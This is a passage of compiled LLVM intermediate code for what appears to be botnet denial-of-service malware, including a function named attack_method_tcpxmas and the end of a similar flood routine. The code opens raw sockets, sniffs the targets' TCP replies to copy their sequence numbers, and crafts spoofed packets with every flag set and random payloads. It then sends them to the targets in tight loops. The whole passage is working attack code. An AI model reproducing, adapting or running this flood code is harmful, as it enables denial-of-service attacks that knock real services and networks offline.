  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %262, align 4
  %265 = trunc i32 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #11
  %267 = zext i16 %266 to i32
  %268 = getelementptr inbounds i8, i8* %248, i64 24
  %269 = bitcast i8* %268 to i32*
  store i32 %267, i32* %269, align 4
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 2
  %271 = load i32, i32* %270, align 4
  %272 = trunc i32 %271 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #11
  %274 = zext i16 %273 to i32
  %275 = getelementptr inbounds i8, i8* %248, i64 28
  %276 = bitcast i8* %275 to i32*
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds i8, i8* %248, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext %139) #11
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %249, i8* %250, i16 zeroext %279, i32 %140)
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %248, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %40, i8* %248, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %286, i32 16) #10
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = icmp slt i32 %289, %46
  br i1 %290, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %298
  %storemerge139160 = phi i32 [ %332, %298 ], [ 0, %.lr.ph.split.preheader ]
  %291 = sext i32 %storemerge139160 to i64
  %292 = getelementptr inbounds i8*, i8** %14, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  %295 = getelementptr inbounds i8, i8* %293, i64 20
  br i1 %137, label %298, label %296

; <label>:296:                                    ; preds = %.lr.ph.split
  %297 = getelementptr inbounds i8, i8* %293, i64 40
  call void @rand_str(i8* %297, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %298

; <label>:298:                                    ; preds = %.lr.ph.split, %296
  %299 = phi i32 [ %storemerge139160, %.lr.ph.split ], [ %.pre, %296 ]
  %300 = getelementptr inbounds i8, i8* %293, i64 10
  %301 = bitcast i8* %300 to i16*
  store i16 0, i16* %301, align 2
  %302 = bitcast i8* %293 to i16*
  %303 = call zeroext i16 @checksum_generic(i16* %302, i32 20)
  store i16 %303, i16* %301, align 2
  %304 = sext i32 %299 to i64
  %305 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %304, i32 1
  %306 = load i32, i32* %305, align 4
  %307 = add i32 %306, 1
  store i32 %307, i32* %305, align 4
  %308 = trunc i32 %306 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #11
  %310 = zext i16 %309 to i32
  %311 = getelementptr inbounds i8, i8* %293, i64 24
  %312 = bitcast i8* %311 to i32*
  store i32 %310, i32* %312, align 4
  %313 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %304, i32 2
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i16
  %316 = call zeroext i16 @htons(i16 zeroext %315) #11
  %317 = zext i16 %316 to i32
  %318 = getelementptr inbounds i8, i8* %293, i64 28
  %319 = bitcast i8* %318 to i32*
  store i32 %317, i32* %319, align 4
  %320 = getelementptr inbounds i8, i8* %293, i64 36
  %321 = bitcast i8* %320 to i16*
  store i16 0, i16* %321, align 4
  %322 = call zeroext i16 @htons(i16 zeroext %139) #11
  %323 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %294, i8* %295, i16 zeroext %322, i32 %140)
  store i16 %323, i16* %321, align 4
  %324 = getelementptr inbounds i8, i8* %293, i64 22
  %325 = bitcast i8* %324 to i16*
  %326 = load i16, i16* %325, align 2
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0, i32 1
  store i16 %326, i16* %327, align 2
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0
  %329 = bitcast %struct.sockaddr_in* %328 to %struct.sockaddr*
  %330 = call i64 @sendto(i32 %40, i8* %293, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %329, i32 16) #10
  %331 = load i32, i32* %5, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %5, align 4
  %333 = icmp slt i32 %332, %46
  br i1 %333, label %.lr.ph.split, label %.loopexit.loopexit204

.loopexit150.loopexit:                            ; preds = %103
  br label %.loopexit150

.loopexit150.loopexit205:                         ; preds = %159
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit205, %.loopexit150.loopexit, %4, %82
  ret void
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #10
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #10
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre175 = sext i32 %37 to i64
  %.pre176 = add nsw i64 %.pre175, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #10
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161

.lr.ph161:                                        ; preds = %.preheader151
  br i1 %51, label %.lr.ph161.split.us.preheader, label %.lr.ph161.split.preheader

.lr.ph161.split.preheader:                        ; preds = %.lr.ph161
  br label %.lr.ph161.split

.lr.ph161.split.us.preheader:                     ; preds = %.lr.ph161
  br label %.lr.ph161.split.us

.lr.ph161.split.us:                               ; preds = %.lr.ph161.split.us.preheader, %.backedge.us
  %86 = phi i32 [ %133, %.backedge.us ], [ %84, %.lr.ph161.split.us.preheader ]
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0) #10
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %88) #10
  store i16 2, i16* %48, align 4
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %93 = load i8, i8* %92, align 4
  %94 = icmp ult i8 %93, 32
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %96 = load i32, i32* %95, align 4
  br i1 %94, label %97, label %100

; <label>:97:                                     ; preds = %.lr.ph161.split.us
  %98 = call i32 @ntohl(i32 %96) #11
  %99 = call i32 @htonl(i32 %98) #11
  br label %100

; <label>:100:                                    ; preds = %97, %.lr.ph161.split.us
  %.sink.us = phi i32 [ %99, %97 ], [ %96, %.lr.ph161.split.us ]
  store i32 %.sink.us, i32* %49, align 4
  store i16 0, i16* %52, align 2
  %101 = call i32 @connect(i32 %86, %struct.sockaddr* nonnull %53, i32 16) #10
  %102 = call i64 @time(i64* null) #10
  br label %103

; <label>:103:                                    ; preds = %127, %100
  store i32 16, i32* %8, align 4
  %104 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %105 = trunc i64 %104 to i32
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %.loopexit150.loopexit, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* %56, align 4
  %109 = load i32, i32* %49, align 4
  %110 = icmp eq i32 %108, %109
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %107
  %sext.us = shl i64 %104, 32
  %112 = ashr exact i64 %sext.us, 32
  %113 = icmp ugt i64 %112, 40
  br i1 %113, label %114, label %127

; <label>:114:                                    ; preds = %111
  %115 = load i16, i16* %58, align 4
  %116 = load i16, i16* %52, align 2
  %117 = icmp eq i16 %115, %116
  br i1 %117, label %118, label %127

; <label>:118:                                    ; preds = %114
  %119 = load i16, i16* %60, align 16
  %120 = and i16 %119, 4608
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %.us-lcssa.us.loopexit, label %122

; <label>:122:                                    ; preds = %118
  %123 = and i16 %119, 1280
  %124 = icmp eq i16 %123, 0
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %122
  %126 = call i32 @close(i32 %86) #10
  br label %.backedge.us

; <label>:127:                                    ; preds = %122, %114, %111, %107
  %128 = call i64 @time(i64* null) #10
  %129 = sub nsw i64 %128, %102
  %130 = icmp sgt i64 %129, 10
  br i1 %130, label %131, label %103

; <label>:131:                                    ; preds = %127
  %132 = call i32 @close(i32 %86) #10
  br label %.backedge.us

.backedge.us:                                     ; preds = %131, %125
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %.loopexit152.loopexit, label %.lr.ph161.split.us

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi177 = phi i64 [ %.pre176, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre175, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %135 = and i32 %17, 65535
  %136 = icmp eq i32 %135, 65535
  %137 = icmp eq i8 %39, 0
  %138 = add nsw i64 %.pre-phi, 20
  %139 = trunc i64 %138 to i16
  %140 = trunc i64 %138 to i32
  br label %.loopexit

.lr.ph161.split:                                  ; preds = %.lr.ph161.split.preheader, %.backedge
  %141 = phi i32 [ %235, %.backedge ], [ %84, %.lr.ph161.split.preheader ]
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 3, i32 0) #10
  %143 = or i32 %142, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %143) #10
  store i16 2, i16* %48, align 4
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %148 = load i8, i8* %147, align 4
  %149 = icmp ult i8 %148, 32
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %151 = load i32, i32* %150, align 4
  br i1 %149, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph161.split
  %153 = call i32 @ntohl(i32 %151) #11
  %154 = call i32 @htonl(i32 %153) #11
  br label %155

; <label>:155:                                    ; preds = %.lr.ph161.split, %152
  %.sink = phi i32 [ %154, %152 ], [ %151, %.lr.ph161.split ]
  store i32 %.sink, i32* %49, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %24) #11
  store i16 %156, i16* %52, align 2
  %157 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %53, i32 16) #10
  %158 = call i64 @time(i64* null) #10
  br label %159

; <label>:159:                                    ; preds = %237, %155
  store i32 16, i32* %8, align 4
  %160 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #10
  %161 = trunc i64 %160 to i32
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %.loopexit150.loopexit205, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %56, align 4
  %165 = load i32, i32* %49, align 4
  %166 = icmp eq i32 %164, %165
  br i1 %166, label %167, label %237

; <label>:167:                                    ; preds = %163
  %sext = shl i64 %160, 32
  %168 = ashr exact i64 %sext, 32
  %169 = icmp ugt i64 %168, 40
  br i1 %169, label %170, label %237

; <label>:170:                                    ; preds = %167
  %171 = load i16, i16* %58, align 4
  %172 = load i16, i16* %52, align 2
  %173 = icmp eq i16 %171, %172
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %170
  %175 = load i16, i16* %60, align 16
  %176 = and i16 %175, 4608
  %177 = icmp eq i16 %176, 4608
  br i1 %177, label %.us-lcssa.us.loopexit206, label %230

.us-lcssa.us.loopexit:                            ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us.loopexit206:                         ; preds = %174
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit206, %.us-lcssa.us.loopexit
  %178 = phi i16 [ %115, %.us-lcssa.us.loopexit ], [ %171, %.us-lcssa.us.loopexit206 ]
  %179 = phi i32 [ %108, %.us-lcssa.us.loopexit ], [ %164, %.us-lcssa.us.loopexit206 ]
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 0
  store i32 %179, i32* %182, align 4
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #11
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 1
  store i32 %185, i32* %186, align 4
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #11
  %190 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 2
  store i32 %189, i32* %190, align 4
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %192 = load i16, i16* %191, align 2
  %193 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 3
  store i16 %192, i16* %193, align 4
  %194 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 4
  store i16 %178, i16* %194, align 2
  %195 = call noalias i8* @malloc(i64 %62) #10
  %196 = getelementptr inbounds i8*, i8** %14, i64 %181
  store i8* %195, i8** %196, align 8
  %197 = getelementptr inbounds i8, i8* %195, i64 20
  %198 = bitcast i8* %197 to %struct.tcphdr*
  %199 = getelementptr inbounds i8, i8* %195, i64 40
  store i8 69, i8* %195, align 4
  %200 = getelementptr inbounds i8, i8* %195, i64 1
  store i8 %16, i8* %200, align 1
  %201 = call zeroext i16 @htons(i16 zeroext %63) #11
  %202 = getelementptr inbounds i8, i8* %195, i64 2
  %203 = bitcast i8* %202 to i16*
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %18) #11
  %205 = getelementptr inbounds i8, i8* %195, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  %207 = getelementptr inbounds i8, i8* %195, i64 8
  store i8 %20, i8* %207, align 4
  br i1 %64, label %212, label %208

; <label>:208:                                    ; preds = %.us-lcssa.us
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %210 = getelementptr inbounds i8, i8* %195, i64 6
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %.us-lcssa.us, %208
  %213 = getelementptr inbounds i8, i8* %195, i64 9
  store i8 6, i8* %213, align 1
  %214 = load i32, i32* @LOCAL_ADDR, align 4
  %215 = getelementptr inbounds i8, i8* %195, i64 12
  %216 = bitcast i8* %215 to i32*
  store i32 %214, i32* %216, align 4
  %217 = getelementptr inbounds i8, i8* %195, i64 16
  %218 = bitcast i8* %217 to i32*
  store i32 %179, i32* %218, align 4
  %219 = bitcast i8* %197 to i16*
  store i16 %192, i16* %219, align 4
  %220 = getelementptr inbounds i8, i8* %195, i64 22
  %221 = bitcast i8* %220 to i16*
  store i16 %178, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %195, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %189, i32* %223, align 4
  %224 = getelementptr inbounds i8, i8* %195, i64 28
  %225 = bitcast i8* %224 to i32*
  store i32 %185, i32* %225, align 4
  %226 = getelementptr inbounds i8, i8* %195, i64 32
  %227 = bitcast i8* %226 to i16*
  %228 = getelementptr inbounds i8, i8* %195, i64 34
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 2
  store i16 %81, i16* %227, align 4
  call void @rand_str(i8* %199, i32 %37)
  br label %.loopexit152

; <label>:230:                                    ; preds = %174
  %231 = and i16 %175, 1280
  %232 = icmp eq i16 %231, 0
  br i1 %232, label %237, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @close(i32 %141) #10
  br label %.backedge

.backedge:                                        ; preds = %233, %241
  %235 = call i32 @socket(i32 2, i32 1, i32 0) #10
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %.loopexit152.loopexit207, label %.lr.ph161.split

; <label>:237:                                    ; preds = %230, %170, %167, %163
  %238 = call i64 @time(i64* null) #10
  %239 = sub nsw i64 %238, %158
  %240 = icmp sgt i64 %239, 10
  br i1 %240, label %241, label %159

; <label>:241:                                    ; preds = %237
  %242 = call i32 @close(i32 %141) #10
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit152

.loopexit152.loopexit207:                         ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit207, %.loopexit152.loopexit, %.preheader151, %212
  %.1 = phi %struct.tcphdr* [ %198, %212 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ], [ %.0162, %.loopexit152.loopexit207 ]
  %243 = load i32, i32* %5, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %5, align 4
  %245 = icmp slt i32 %244, %46
  br i1 %245, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %255
  br label %.loopexit.backedge

.loopexit.loopexit204:                            ; preds = %298
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit204
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %136, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %255
  %storemerge139160.us = phi i32 [ %289, %255 ], [ 0, %.lr.ph.split.us.preheader ]
  %246 = sext i32 %storemerge139160.us to i64
  %247 = getelementptr inbounds i8*, i8** %14, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  %250 = getelementptr inbounds i8, i8* %248, i64 20
  %251 = getelementptr inbounds i8, i8* %248, i64 4
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br i1 %137, label %255, label %253

; <label>:253:                                    ; preds = %.lr.ph.split.us
  %254 = getelementptr inbounds i8, i8* %248, i64 40
  call void @rand_str(i8* %254, i32 %37)
  %.pre174 = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %253, %.lr.ph.split.us
  %256 = phi i32 [ %.pre174, %253 ], [ %storemerge139160.us, %.lr.ph.split.us ]
  %257 = getelementptr inbounds i8, i8* %248, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %248 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = sext i32 %256 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %262, align 4
  %265 = trunc i32 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #11
  %267 = zext i16 %266 to i32
  %268 = getelementptr inbounds i8, i8* %248, i64 24
  %269 = bitcast i8* %268 to i32*
  store i32 %267, i32* %269, align 4
  %270 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %261, i32 2
  %271 = load i32, i32* %270, align 4
  %272 = trunc i32 %271 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #11
  %274 = zext i16 %273 to i32
  %275 = getelementptr inbounds i8, i8* %248, i64 28
  %276 = bitcast i8* %275 to i32*
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds i8, i8* %248, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext %139) #11
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %249, i8* %250, i16 zeroext %279, i32 %140)
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %248, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %40, i8* %248, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %286, i32 16) #10
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = icmp slt i32 %289, %46
  br i1 %290, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %298
  %storemerge139160 = phi i32 [ %332, %298 ], [ 0, %.lr.ph.split.preheader ]
  %291 = sext i32 %storemerge139160 to i64
  %292 = getelementptr inbounds i8*, i8** %14, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  %295 = getelementptr inbounds i8, i8* %293, i64 20
  br i1 %137, label %298, label %296

; <label>:296:                                    ; preds = %.lr.ph.split
  %297 = getelementptr inbounds i8, i8* %293, i64 40
  call void @rand_str(i8* %297, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %298

; <label>:298:                                    ; preds = %.lr.ph.split, %296
  %299 = phi i32 [ %storemerge139160, %.lr.ph.split ], [ %.pre, %296 ]
  %300 = getelementptr inbounds i8, i8* %293, i64 10
  %301 = bitcast i8* %300 to i16*
  store i16 0, i16* %301, align 2
  %302 = bitcast i8* %293 to i16*
  %303 = call zeroext i16 @checksum_generic(i16* %302, i32 20)
  store i16 %303, i16* %301, align 2
  %304 = sext i32 %299 to i64
  %305 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %304, i32 1
  %306 = load i32, i32* %305, align 4
  %307 = add i32 %306, 1
  store i32 %307, i32* %305, align 4
  %308 = trunc i32 %306 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #11
  %310 = zext i16 %309 to i32
  %311 = getelementptr inbounds i8, i8* %293, i64 24
  %312 = bitcast i8* %311 to i32*
  store i32 %310, i32* %312, align 4
  %313 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %304, i32 2
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i16
  %316 = call zeroext i16 @htons(i16 zeroext %315) #11
  %317 = zext i16 %316 to i32
  %318 = getelementptr inbounds i8, i8* %293, i64 28
  %319 = bitcast i8* %318 to i32*
  store i32 %317, i32* %319, align 4
  %320 = getelementptr inbounds i8, i8* %293, i64 36
  %321 = bitcast i8* %320 to i16*
  store i16 0, i16* %321, align 4
  %322 = call zeroext i16 @htons(i16 zeroext %139) #11
  %323 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %294, i8* %295, i16 zeroext %322, i32 %140)
  store i16 %323, i16* %321, align 4
  %324 = getelementptr inbounds i8, i8* %293, i64 22
  %325 = bitcast i8* %324 to i16*
